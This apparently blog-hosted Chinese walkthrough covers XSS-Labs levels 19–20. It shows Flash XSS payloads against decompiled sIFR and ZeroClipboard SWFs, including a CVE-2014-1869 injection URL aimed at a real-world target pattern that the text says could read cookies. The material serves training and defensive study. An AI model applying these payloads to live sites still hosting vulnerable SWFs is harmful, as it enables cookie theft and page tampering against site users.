 浏览器拿到网页源码，解析`<div> <img> <embed>`这些标签，识别事件`onclick`，执行 JS。

本关：PHP 的`htmlspecialchars()` + 双引号`src="..."`把这条路堵死了。我们**不能在浏览器这一层插入标签、事件**。



##### 1.2 Flash 内部渲染
swf 是一个独立程序，它不是浏览器。Flash 内部自带一套简易的 HTML 解析引擎。 它可以接收一段字符串，**Flash 自己去解析这段字符串里的 HTML 标签**，不是浏览器解析。

---

#### 2. 两种利用形式
##### 2.1 ExternalInterface.call()
```plain
//伪代码，swf内部逻辑
ExternalInterface.call(userInput);
```

>  swf 直接调用浏览器原生 JS 函数。
>



##### 2.2 htmlText渲染HTML
```plain
// userInput 就是我们URL传进去可控参数
txt.htmlText = userInput;
```

swf把我们传入的参数直接赋值给`htmlText`，Flash会解析里面的标签、事件。

> Flash自己的HTML解析器去解析字符串。
>

---

### Q3：JPEXS Free Flash Decompiler 是什么？
####  1. 基础概念
开源、Java编写的SWF反编译工具，CTF‑XSF靶场必备工具，用来扒`.swf`里面的ActionScript源码。

`.swf`是编译后的二进制文件，原始源码（`.as` ActionScript）被编译成字节码，普通记事本打不开看逻辑。  
**FFDec作用：把swf字节码还原回可读的ActionScript源代码**，看清swf内部做了什么逻辑。

下载地址：[https://github.com/jindrapetrik/jpexs-decompiler](https://github.com/jindrapetrik/jpexs-decompiler)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937325573_b1kldq.webp)

---

#### 2. 核心功能
1. ✅反编译ActionScript 1/2/3，还原源代码，同时还可以看底层P‑code字节码
2. ✅查看swf读取url参数逻辑：`root.loaderInfo.parameters.xxx`
3. ✅查找危险函数：`ExternalInterface.call()`、赋值给`htmlText`等漏洞点
4. ✅提取图片、音频资源；也可以修改代码，重新导出swf文件

> XSF漏洞的逻辑藏在swf内部，网页PHP代码看不到swf逻辑，需要使用JPEXS‑FFDec反编译swf，读取ActionScript源码，确认参数读取与危险API调用，才可以构造对应payload。
>

---

## 2. payload
### 2.1 把 `xsf03.swf`直接拖进窗口
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937327774_xj7von.webp)

---

### 2.2 找Flash 的“危险出口”
### Q4：Flash Sink  
> sink：污点流向的**危险目标函数**；source：污染源，这里就是`loaderInfo.parameters`从 URL 读入的可控参数。 污点流向：`URL参数(source) → 变量 → sink危险函数 → XSF漏洞 payload`
>

#### 1. htmlText
+ 风险原理：Flash内部把传入字符串当作HTML渲染
+ payload：`<a href="javascript:alert(1)">`
+ 关键点：Flash的HTML解析残缺，不支持script、onerror；只有少数标签可用（a/b/i/u/font/p/img 这几个)；**必须点击a标签才会触发，不能自动跑**

****

#### 2. ExternalInterface.call(func, arg)
+ 风险原理：Flash直接调用浏览器的JS函数
+ 两种可利用场景：

| 代码 | 是否可利用 | payload |
| --- | --- | --- |
| `call(userInput)` | ✅函数名可控 | `alert` |
| `call("eval",userInput)` | ✅eval + 参数可控 | `alert(1)` |
| `call("alert",userInput)` | ❌不可利用 | 无法执行任意代码 |




#### 3. getURL / navigateToURL
+ 风险原理：做页面跳转，支持`javascript:`伪协议
+ payload：`javascript:alert(1)`
+ 关键点：加载就可以自动触发，不用点击；受Flash沙箱、allowScriptAccess策略约束，真实环境容易被拦截



#### 4. 总结
把JS包装成sink愿意接收的格式：

+ htmlText → 包装成a标签HTML片段
+ ExternalInterface.call → 填函数名 / eval的参数字符串
+ getURL → 包装成javascript伪协议URL

---

### 2.3 搜关键词 htmlText
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937329830_ulybb6.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937331547_wijrtl.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937333860_6qawju.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937336399_z0idv1.webp)

```html
this.textField.htmlText = ["<p class=\"",sIFR.CSS_ROOT_CLASS,"\">",content,"</p>"].join("");
```

使用`htmlText`作为 sink，数组 join 拼接字符串；若`content`变量来自 URL 可控参数，可注入 HTML 标签，构造携带`javascript:`伪协议的 a 标签，实现点击触发 XSF。Flash 内部解析 HTML，不受外层 HTML 页面`htmlspecialchars()`转义防护。  

---

### 2.4 搜变量名 content
```html
class sIFR
{
   var content;
   var fontSize;
   var forceSingleLine;
   var primaryLink;
   var primaryLinkTarget;
   var realHeight;
   var renderHeight;
   var textField;
   var tuneHeight;
   var tuneWidth;
   static var instance;
   static var menu;
   static var DEFAULT_TEXT = "Rendered with sIFR 3, revision 436<br><strong>Rendered with sIFR 3, revision 436</strong><br><em>Rendered with sIFR 3, revision 436</em><br><strong><em>Rendered with sIFR 3, revision 436</em></strong>";
   static var VERSION_WARNING = "Movie (436) is incompatible with sifr.js (%s). Use movie of %s.<br><strong>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</strong><br><em>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</em><br><strong><em>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</em></strong>";
   static var CSS_ROOT_CLASS = "sIFR-root";
   static var DEFAULT_WIDTH = 300;
   static var DEFAULT_HEIGHT = 100;
   static var DEFAULT_ANTI_ALIAS_TYPE = "advanced";
   static var MARGIN_LEFT = -3;
   static var PADDING_BOTTOM = 5;
   static var LEADING_REMAINDER = 2;
   static var MIN_FONT_SIZE = 6;
   static var MAX_FONT_SIZE = 126;
   static var MIN_HEIGHT = 10;
   static var ALIASING_MAX_FONT_SIZE = 48;
   static var VERSION = "436";
   static var styles = new SifrStyleSheet();
   static var fromLocal = true;
   static var domains = [];
   static var defaultKerning = true;
   static var defaultSharpness = 0;
   static var defaultThickness = 0;
   static var defaultOpacity = -1;
   static var defaultBlendMode = -1;
   static var enforcedGridFitType = null;
   static var preserveAntiAlias = false;
   static var conditionalAntiAlias = true;
   static var antiAliasType = null;
   static var filters = [];
   static var filterMap = {DisplacementMapFilter:flash.filters.DisplacementMapFilter,ColorMatrixFilter:flash.filters.ColorMatrixFilter,ConvolutionFilter:flash.filters.ConvolutionFilter,GradientBevelFilter:flash.filters.GradientBevelFilter,GradientGlowFilter:flash.filters.GradientGlowFilter,BevelFilter:flash.filters.BevelFilter,GlowFilter:flash.filters.GlowFilter,BlurFilter:flash.filters.BlurFilter,DropShadowFilter:flash.filters.DropShadowFilter};
   static var menuItems = [];
   var firstResize = true;
   function sIFR(textField, content)		//  第二个参数在这里取名 content
   {
      sIFR.instance = this;
      this.textField = textField;
      this.content = content;			// payload 字符串保存到当前实例对象的this.content属性
      this.primaryLink = sIFR.unescapeUnicode(_root.link);
      this.primaryLinkTarget = sIFR.unescapeUnicode(_root.target);
      var _loc4_ = _global.parseInt(_root.offsetleft,10);
      textField._x = sIFR.MARGIN_LEFT + (!_global.isNaN(_loc4_) ? _loc4_ : 0);
      var _loc5_ = _global.parseInt(_root.offsettop,10);
      if(!_global.isNaN(_loc5_))
      {
         textField._y += _loc5_;
      }
      this.tuneWidth = _global.parseInt(_root.tunewidth,10);
      if(_global.isNaN(this.tuneWidth))
      {
         this.tuneWidth = 0;
      }
      this.tuneHeight = _global.parseInt(_root.tuneheight,10);
      if(_global.isNaN(this.tuneHeight))
      {
         this.tuneHeight = 0;
      }
      this.renderHeight = _global.parseInt(_root.renderheight,10);
      this.setTextFieldSize(_global.parseInt(_root.width,10),_global.parseInt(this.renderHeight,10));
      this.forceSingleLine = _root.forcesingleline == "true";
      textField.wordWrap = _root.preventwrap != "true";
      textField.selectable = _root.selectable == "true";
      textField.gridFitType = sIFR.enforcedGridFitType || _root.gridfittype;
      this.applyFilters();
      this.applyBackground();
      this.fontSize = _global.parseInt(_root.size,10);
      if(_global.isNaN(this.fontSize))
      {
         this.fontSize = 26;
      }
      this.setStyles(sIFR.unescapeUnicode(_root.css),false);
      if(!sIFR.preserveAntiAlias && (sIFR.conditionalAntiAlias && this.fontSize < sIFR.ALIASING_MAX_FONT_SIZE || !sIFR.conditionalAntiAlias))
      {
         textField.antiAliasType = (_root.antialiastype == "" ? sIFR.antiAliasType : _root.antialiastype) || sIFR.DEFAULT_ANTI_ALIAS_TYPE;
      }
      if(!sIFR.preserveAntiAlias || !_global.isNaN(_global.parseInt(_root.sharpness,10)))
      {
         textField.sharpness = _global.parseInt(_root.sharpness,10);
      }
      if(_global.isNaN(textField.sharpness))
      {
         textField.sharpness = sIFR.defaultSharpness;
      }
      if(!sIFR.preserveAntiAlias || !_global.isNaN(_global.parseInt(_root.thickness,10)))
      {
         textField.thickness = _global.parseInt(_root.thickness,10);
      }
      if(_global.isNaN(textField.thickness))
      {
         textField.thickness = sIFR.defaultThickness;
      }
      textField._parent._xscale = textField._parent._yscale = 100;
      this.setupEvents();
      this.write(content);		// 携带 payload 的 content 送入 write 函数
      this.repaint();
   }
   static function setDefaultStyles()
   {
      sIFR.styles.parseCSS([".",sIFR.CSS_ROOT_CLASS," { color: #000000; }","strong { display: inline; font-weight: bold; } ","em { display: inline; font-style: italic; }","a { color: #0000FF; text-decoration: underline; }","a:hover { color: #0000FF; text-decoration: none; }"].join(""));
   }
   static function checkDomain()
   {
      if(sIFR.domains.length == 0)
      {
         return true;
      }
      var _loc2_ = new LocalConnection().domain();
      var _loc3_ = 0;
      var _loc4_;
      var _loc5_;
      var _loc6_;
      while(_loc3_ < sIFR.domains.length)
      {
         _loc4_ = sIFR.domains[_loc3_];
         if(_loc4_ == "*" || _loc4_ == _loc2_)
         {
            return true;
         }
         _loc5_ = _loc4_.lastIndexOf("*");
         if(_loc5_ > -1)
         {
            _loc4_ = _loc4_.substr(_loc5_ + 1);
            _loc6_ = _loc2_.lastIndexOf(_loc4_);
            if(_loc6_ > -1 && _loc6_ + _loc4_.length == _loc2_.length)
            {
               return true;
            }
         }
         _loc3_ = _loc3_ + 1;
      }
      return false;
   }
   static function checkLocation()
   {
      return _root._url.indexOf("?") == -1;
   }
   static function run(delayed)
   {
      if(_root.delayrun == "true" && !delayed)
      {
         var interval;
         interval = _global.setInterval(function()
         {
            _global.clearInterval(interval);
            sIFR.run(true);
         }
         ,200);
         return undefined;
      }
      sIFR.menuItems.push(new ContextMenuItem("Follow link",function()
      {
         getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget);
      }),new ContextMenuItem("Open link in new window",function()
      {
         getURL(sIFR.instance.primaryLink,"_blank");
      }));
      var _loc3_ = _root.holder;
      var _loc4_ = sIFR.DEFAULT_TEXT;
      var _loc5_ = true;
      if(sIFR.checkLocation() && sIFR.checkDomain())
      {
         _loc4_ = sIFR.unescapeUnicode(_root.content);
      }
      var _loc6_;
      if(_loc4_ == "undefined" || _loc4_ == "")
      {
         _loc6_ = flash.external.ExternalInterface.call("sIFR.__resetBrokenMovies");
         if(_loc6_)
         {
            return undefined;
         }
         _loc4_ = sIFR.DEFAULT_TEXT;
         _loc5_ = false;
      }
      if(_loc5_ && _root.version != sIFR.VERSION)
      {
         _loc4_ = sIFR.VERSION_WARNING.split("%s").join(_root.version);
      }	// 把警告模板字符串按%s切开，用_root.version（我们的 payload）替换掉模板里的%s占位符，完成字符串拼接。
      Stage.scaleMode = "noscale";
      Stage.align = "TL";
      sIFR.menu = new ContextMenu();
      sIFR.menu.hideBuiltInItems();
      _root.menu = sIFR.menu;
      var _loc7_ = _global.parseInt(_root.opacity,10);
      if(!_global.isNaN(_loc7_))
      {
         _loc3_._alpha = sIFR.defaultOpacity != -1 ? sIFR.defaultOpacity : _loc7_;
      }
      else
      {
         _loc3_._alpha = 100;
      }
      _root.blendMode = sIFR.defaultBlendMode != -1 ? sIFR.defaultBlendMode : _root.blendmode;
      sIFR.instance = new sIFR(_loc3_.txtF,_loc4_);		// _loc4_ 被塞进构造函数的第二个参数
      Key.addListener({onKeyDown:function()
      {
         sIFR.instance.blur();
      }});
      Mouse.addListener({onMouseWheel:function()
      {
         sIFR.instance.blur();
      }});
      Stage.addListener({onResize:function()
      {
         sIFR.instance.onResize();
      }});
      if(_root.selectable == "false")
      {
         Mouse.addListener({onMouseDown:function()
         {
            sIFR.instance.blur();
         }});
      }
      if(_root.cursor == "arrow")
      {
         _root.holder.useHandCursor = false;
      }
      flash.external.ExternalInterface.addCallback("replaceText",sIFR.instance,sIFR.instance.replaceText);
      flash.external.ExternalInterface.addCallback("calculateRatios",sIFR.instance,sIFR.instance.calculateRatios);
      flash.external.ExternalInterface.addCallback("resize",sIFR.instance,sIFR.instance.resize);
      flash.external.ExternalInterface.addCallback("scaleMovie",sIFR.instance,sIFR.instance.repaint);
      flash.external.ExternalInterface.addCallback("changeCSS",sIFR.instance,sIFR.instance.changeCSS);
   }
   static function eval(str)
   {
      var _loc3_;
      var _loc4_;
      var _loc5_;
      var _loc6_;
      if(str.charAt(0) == "{")
      {
         _loc3_ = {};
         str = str.substring(1,str.length - 1);
         _loc4_ = str.split(",");
         _loc5_ = 0;
         while(_loc5_ < _loc4_.length)
         {
            _loc6_ = _loc4_[_loc5_].split(":");
            _loc3_[_loc6_[0]] = sIFR.eval(_loc6_[1]);
            _loc5_ = _loc5_ + 1;
         }
      }
      else if(str.charAt(0) == "\"")
      {
         _loc3_ = str.substring(1,str.length - 1);
      }
      else if(str == "true" || str == "false")
      {
         _loc3_ = str == "true";
      }
      else
      {
         _loc3_ = _global.parseFloat(str);
      }
      return _loc3_;
   }
   static function unescapeUnicode(str)
   {
      var _loc3_ = [];
      var _loc4_ = str.split("%");
      var _loc5_ = 0;
      var _loc6_;
      var _loc7_;
      while(_loc5_ < _loc4_.length)
      {
         _loc6_ = _loc4_[_loc5_];
         if(_loc5_ > 0 || str.charAt(0) == "%")
         {
            _loc7_ = _loc6_.charAt(0) != "u" ? _loc6_.substr(0,2) : _loc6_.substr(1,4);
            _loc3_.push(String.fromCharCode(_global.parseInt(_loc7_,16)),_loc6_.substr(_loc6_.charAt(0) != "u" ? 2 : 5));
         }
         else
         {
            _loc3_.push(_loc6_);
         }
         _loc5_ = _loc5_ + 1;
      }
      return _loc3_.join("");
   }
   function applyFilters()
   {
      var _loc2_ = this.textField.filters;
      _loc2_ = _loc2_.concat(sIFR.filters);
      var _loc3_ = sIFR.unescapeUnicode(_root.flashfilters).split(";");
      var _loc4_ = 0;
      var _loc5_;
      var _loc6_;
      var _loc7_;
      var _loc8_;
      while(_loc4_ < _loc3_.length)
      {
         _loc5_ = _loc3_[_loc4_].split(",");
         _loc6_ = new sIFR.filterMap[_loc5_[0]]();
         _loc7_ = 1;
         while(_loc7_ < _loc5_.length)
         {
            _loc8_ = _loc5_[_loc7_].split(":");
            _loc6_[_loc8_[0]] = sIFR.eval(sIFR.unescapeUnicode(_loc8_[1]));
            _loc7_ = _loc7_ + 1;
         }
         _loc2_.push(_loc6_);
         _loc4_ = _loc4_ + 1;
      }
      this.textField.filters = _loc2_;
   }
   function applyBackground()
   {
      if(!_root.background)
      {
         return undefined;
      }
      var background = _root.createEmptyMovieClip("backgroundClip",10);
      var _loc2_ = new MovieClipLoader();
      _loc2_.addListener({onLoadInit:function()
      {
         background.setMask(_root.holder);
      }});
      _loc2_.loadClip("/projectfiles/img.jpg",background);
   }
   function setTextFieldSize(width, height)
   {
      this.textField._width = this.tuneWidth + (!_global.isNaN(width) ? width : sIFR.DEFAULT_WIDTH);
      this.textField._height = this.tuneHeight + (!_global.isNaN(height) ? height : sIFR.DEFAULT_HEIGHT);
   }
   static function call(method)
   {
      var _loc3_ = Array.prototype.slice.call(arguments,1);
      _loc3_.unshift("sIFR.replacements[\"" + _root.id + "\"]." + method);
      return flash.external.ExternalInterface.call.apply(flash.external.ExternalInterface,_loc3_);
   }
   function repaint()
   {
      if(this.forceSingleLine)
      {
         this.textField._width = 50000;
         this.textField._width = this.textField.textWidth + 500;
      }
      var _loc2_ = !this.isSingleLine() ? 0 : sIFR.styles.latestLeading;
      this.textField._height = Math.max(sIFR.MIN_HEIGHT,this.textField.textHeight + sIFR.PADDING_BOTTOM + this.tuneHeight - _loc2_) + this.fontSize + Math.abs(this.tuneHeight);
      this.realHeight = Math.floor(this.textField._height - this.fontSize - Math.abs(this.tuneHeight));
      var width = _root.fitexactly != "true" ? null : this.textField.textWidth + this.tuneWidth;
      this.doScale(function()
      {
         var _loc2_ = sIFR.instance.firstResize;
         sIFR.instance.firstResize = false;
         sIFR.call("resizeFlashElement",sIFR.instance.realHeight,width,_loc2_);
         sIFR.instance.renderHeight = sIFR.instance.realHeight;
      }
      );
   }
   function write(content)
   {	// 终点:htmlText 渲染
      this.textField.htmlText = ["<p class=\"",sIFR.CSS_ROOT_CLASS,"\">",content,"</p>"].join("");
   }
   function isSingleLine()
   {
      return Math.round((this.textField.textHeight - sIFR.styles.latestLeading) / this.fontSize) == 1;
   }
   function doScale(callback)
   {
      if(this.validScale())
      {
         return this.scale(callback);
      }
      var self = this;
      this.textField._parent.onEnterFrame = function()
      {
         if(!self.validScale())
         {
            return undefined;
         }
         delete self.textField._parent.onEnterFrame;
         self.scale(callback);
      };
   }
   function scale(callback)
   {
      this.textField._parent._xscale = this.textField._parent._yscale = this.calculateScale();
      if(callback)
      {
         callback();
      }
   }
   function calculateScale()
   {
      return 10 * Math.round(10 * Stage.height / this.renderHeight);
   }
   function validScale()
   {
      return Stage.height >= 10 && this.calculateScale() >= 20;
   }
   function onResize()
   {
      if(!this.validScale())
      {
         return undefined;
      }
      var _loc2_ = this.textField._parent._xscale;
      var _loc3_ = this.calculateScale();
      this.scale();
      if(_loc2_ != _loc3_)
      {
         sIFR.call("resizeAfterScale");
      }
   }
   function calculateRatios()
   {
      var _loc2_ = ["x","x<br>x","x<br>x<br>x","x<br>x<br>x<br>x"];
      var _loc3_ = {};
      this.setTextFieldSize(1000,1000);
      var _loc4_ = 1;
      var _loc5_;
      var _loc6_;
      var _loc7_;
      while(_loc4_ <= _loc2_.length)
      {
         _loc5_ = sIFR.MIN_FONT_SIZE;
         this.write(_loc2_[_loc4_ - 1]);
         while(_loc5_ < sIFR.MAX_FONT_SIZE)
         {
            _loc6_ = sIFR.styles.getStyle(".sIFR-root") || {};
            _loc6_.fontSize = _loc5_;
            sIFR.styles.setStyle(".sIFR-root",_loc6_);
            this.textField.styleSheet = sIFR.styles;
            this.repaint();
            _loc7_ = (this.realHeight - sIFR.PADDING_BOTTOM - this.tuneHeight) / _loc4_ / _loc5_;
            if(!_loc3_[_loc5_])
            {
               _loc3_[_loc5_] = _loc7_;
            }
            else
            {
               _loc3_[_loc5_] = ((_loc4_ - 1) * _loc3_[_loc5_] + _loc7_) / _loc4_;
            }
            _loc5_ = _loc5_ + 1;
         }
         _loc4_ = _loc4_ + 1;
      }
      var _loc8_ = [];
      var _loc9_ = this.roundDecimals(_loc3_[sIFR.MIN_FONT_SIZE],2);
      var _loc10_ = sIFR.MIN_FONT_SIZE + 1;
      var _loc11_;
      while(_loc10_ < sIFR.MAX_FONT_SIZE)
      {
         _loc11_ = this.roundDecimals(_loc3_[_loc10_],2);
         if(_loc9_ != _loc3_[_loc10_ - 1] && (_loc9_ != _loc11_ && Math.abs(Math.round(_loc10_ * _loc11_) - Math.round(_loc10_ * _loc9_)) >= 1))
         {
            _loc8_.push(_loc10_ - 1,_loc9_);
            _loc9_ = _loc11_;
         }
         _loc10_ = _loc10_ + 1;
      }
      _loc8_.push(_loc9_);
      flash.external.ExternalInterface.call("sIFR.debug.__ratiosCallback",_root.id,_loc8_);
   }
   function roundDecimals(value, decimals)
   {
      return Math.round(value * Math.pow(10,decimals)) / Math.pow(10,decimals);
   }
   function replaceText(content)
   {
      this.content = sIFR.unescapeUnicode(content);
      this.setupEvents();
      this.write(this.content);
      this.repaint();
   }
   function resize(height)
   {
      this.setTextFieldSize(height,this.realHeight);
      this.repaint();
   }
   function changeCSS(css)
   {
      this.setStyles(sIFR.unescapeUnicode(css),true);
      this.repaint();
   }
   function contentIsLink()
   {
      return this.content.indexOf("<a ") == 0 && (this.content.indexOf("<a ") == this.content.lastIndexOf("<a ") && this.content.indexOf("</a>") == this.content.length - 4);
   }
   function setupEvents()
   {
      if(_root.fixhover == "true" && this.contentIsLink())
      {
         this.textField._parent.onRollOver = function()
         {
            sIFR.call("fireEvent","onRollOver");
         };
         this.textField._parent.onRollOut = function()
         {
            sIFR.instance.fixHover();
            sIFR.call("fireEvent","onRollOut");
         };
         this.textField._parent.onRelease = function()
         {
            sIFR.call("fireEvent","onRelease");
            getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget);
         };
         sIFR.menu.customItems = sIFR.menuItems;
      }
      else
      {
         if(_root.events == "true")
         {
            this.textField._parent.onRollOver = function()
            {
               sIFR.call("fireEvent","onRollOver");
            };
            this.textField._parent.onRollOut = function()
            {
               sIFR.call("fireEvent","onRollOut");
            };
            this.textField._parent.onRelease = function()
            {
               sIFR.call("fireEvent","onRelease");
            };
         }
         else
         {
            if(_root.cursor == "pointer")
            {
               this.textField._parent.onRelease = function()
               {
               };
            }
            else
            {
               delete this.textField._parent.onRelease;
            }
            delete this.textField._parent.onRollOver;
            delete this.textField._parent.onRollOut;
         }
         sIFR.menu.customItems = [];
      }
   }
   function fixHover()
   {
      this.write("");
      this.write(this.content);
   }
   function blur()
   {
      switch(Key.getCode())
      {
         case Key.SHIFT:
         case Key.CONTROL:
            return;
         default:
            sIFR.call("blurFlashElement");
            return;
      }
   }
   function setStyles(css, reset)
   {
      if(reset)
      {
         sIFR.styles = new SifrStyleSheet();
         sIFR.setDefaultStyles();
      }
      sIFR.styles.fontSize = this.fontSize;
      sIFR.styles.parseCSS(css);
      var _loc4_ = sIFR.styles.getStyle(".sIFR-root") || {};
      _loc4_.fontSize = this.fontSize;
      sIFR.styles.setStyle(".sIFR-root",_loc4_);
      this.textField.styleSheet = sIFR.styles;
   }
}

```

+ `_root.content`：访问 swf 全局上叫`xxx`的变量。  
    - `_root`代表 swf 根域；
    - `content`是**source 污染源**，从 URL GET 参数读取进来的可控输入。

### 2.5 htmlText 渲染的流程
```plain
URL ?version=payload
        ↓
_root.version（污点source）
        ↓
警告文字.split("%s").join(_root.version)
        ↓
_loc4_ （拼接完带payload的警告字符串）
        ↓
new sIFR(_loc3_.txtF, _loc4_)  //传入构造函数第二个参数
        ↓
sIFR构造函数 → this.content = content
        ↓
this.write(content)
        ↓
write()函数内部
        ↓
this.textField.htmlText = [...content...].join("")  //sink终点
        ↓
Flash内部解析HTML，注入<a href="javascript:xxx">，需要点击触发XSF
```

sIFR构造函数参数`content` 和 `_root.content`**只是名字一样，不是同一个变量**。 

这里整条链路污染源是`_root.version`，不是`_root.content`。

所以传`?arg01=content&arg02=<a href="javascript:alert(1)">xss</a>`没用

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937338119_8ltzl6.webp)

---

### 2.6 构造payload
payload交给swf，**在Flash程序内部完成代码执行**。

```html
?arg01=version&arg02=<a href="javascript:alert(1)">xss</a>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937340778_2guct6.webp)



<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937343062_ck36xd.webp)<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937345279_4gocom.webp)

---

# Level 20
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937347682_4ut1y5.webp)

## 1. ExternalInterface.call
和 Level 19 差不多，从 htmlText变成了ExternalInterface.call()

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level21.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level20</title>
</head>
<body>
<h1 align=center>欢迎来到level20</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937349803_2xxsfh.webp)

---

## 2. payload
### 2.1 关键词 ExternalInterface.call
ExternalInterface.call：把数据拼进 JS 源码执行

```html
package
{
   import flash.display.LoaderInfo;
   import flash.display.Sprite;
   import flash.display.StageScaleMode;
   import flash.events.*;
   import flash.external.ExternalInterface;
   import flash.system.Security;
   import flash.system.System;
   import flash.utils.*;
   
   public class ZeroClipboard extends Sprite
   {
      
      private var button:Sprite;
      
      private var id:String = "";
      
      private var clipText:String = "";
      
      public function ZeroClipboard()
      {
         var flashvars:Object;
         super();
         stage.scaleMode = StageScaleMode.EXACT_FIT;
         Security.allowDomain("*");
         flashvars = LoaderInfo(this.root.loaderInfo).parameters;
         id = flashvars.id;
         button = new Sprite();
         button.buttonMode = true;
         button.useHandCursor = true;
         button.graphics.beginFill(13434624);
         button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height));
         button.alpha = 0;
         addChild(button);
         button.addEventListener(MouseEvent.CLICK,clickHandler);
         button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseOver",null);
         });
         button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseOut",null);
         });
         button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseDown",null);
         });
         button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseUp",null);
         });
         ExternalInterface.addCallback("setHandCursor",setHandCursor);
         ExternalInterface.addCallback("setText",setText);
         ExternalInterface.call("ZeroClipboard.dispatch",id,"load",null);
      }
      
      public function setHandCursor(param1:Boolean) : *
      {
         button.useHandCursor = param1;
      }
      
      private function clickHandler(param1:Event) : void
      {
         System.setClipboard(clipText);
         ExternalInterface.call("ZeroClipboard.dispatch",id,"complete",clipText);
      }
      
      public function setText(param1:*) : *
      {
         clipText = param1;
      }
   }
}


```

四个参数：`call("ZeroClipboard.dispatch", id, "load", null)` ——第 1、3、4位写死，只有 id 是变量。

### 2.2 搜 id
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937352033_gs73vb.webp)

### 2.3 流程
?id=值 → flashvars.id → call 的第2参 → 拼进JS源码 → 执行

---

## 2. payload
### Q1：ZeroClipboard 是什么？
ZeroClipboard 是一个基于JavaScript和透明Flash实现跨浏览器文本复制的库。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937353748_7hneij.webp)

#### 1. ZeroClipboard原本用途
2010年初浏览器JS不允许直接操作剪贴板。  
ZeroClipboard实现网页**一键复制**功能：由JS库 + 一个SWF文件组成。

+ SWF：真正完成剪贴板复制操作
+ JS：负责页面交互逻辑
+ 通信：依靠`ExternalInterface`在Flash和浏览器JS之间传递消息。

---

#### 2. 正常无漏洞流程
1. 网页引入`zeroclipboard.js`，复制按钮上方覆盖一层透明swf

```plain
<embed src="ZeroClipboard.swf?id=ZeroClipboardMovie_1&width=..&height=..">
```

`id`由JS库内部生成，是安全可控的值。

2. SWF加载完成自动向外上报：

```plain
ExternalInterface.call("ZeroClipboard.dispatch", id, "load", null)
```

向浏览器发送load事件，告知JS：swf已经就绪。**这一步加载自动执行，不需要点击**。

3. 网页JS存在`ZeroClipboard.dispatch()`函数，接收事件，标记复制按钮就绪。
4. 用户点击按钮 → SWF执行剪贴板复制 → 再次dispatch发送copy事件，网页JS弹出复制成功提示。

---

#### 3. 漏洞原理
 仓库 issue 链接：  [https://github.com/zeroclipboard/zeroclipboard/issues/14](https://github.com/zeroclipboard/zeroclipboard/issues/14)

对应 CVE：**CVE‑2014‑1869**

1. ZeroClipboard.swf 加载
2. swf 把可控 id 拼接到 JS 字符串，交给浏览器
3. 浏览器执行被篡改后的 JS
4. 尝试调用`ZeroClipboard.dispatch`，该函数不存在，抛出 ReferenceError
5. 我们注入的`catch(e){alert(1)}`捕获异常，执行恶意 JS。

> 关键点：swf一加载就自动执行call，**不需要用户点击，自动触发XSF**。
>
> 区分：
>
> + 漏洞载体：ZeroClipboard.swf（swf，Flash 文件）
> + 被调用对象：`ZeroClipboard.dispatch` **不在 swf 内部**，是浏览器网页的 JS 函数，攻击场景不存在，抛出`ReferenceError`。  
>



#### 4. 真实攻击场景
目标网站存在未打补丁的`ZeroClipboard.swf`。  
攻击者诱导受害者访问链接：

```plain
https://victim.com/js/ZeroClipboard.swf?id=\"))}catch(e){alert(/XSS/.source);}//&width=500&height=500
```

1. 直接访问swf，Flash运行环境域属于`victim.com`。
2. 注入的JS在目标站点域名下执行，可以读取cookie、篡改页面，形成反射XSS。
3. `width=500&height=500`必不可少：缺少宽高参数，swf内部绘制逻辑会拦截漏洞触发。

---

### 2.1 真实场景 vs 本关
| 项目 | 真实场景 | 本关 |
| --- | --- | --- |
| id如何可控 | 直接访问swf，URL查询串作为flashvars | 通过arg01/arg02由PHP解析，塞进embed标签 |
| width、height传递 | URL直接`&`分隔参数 | `&`需要URL编码为`%26`绕过PHP参数解析 |




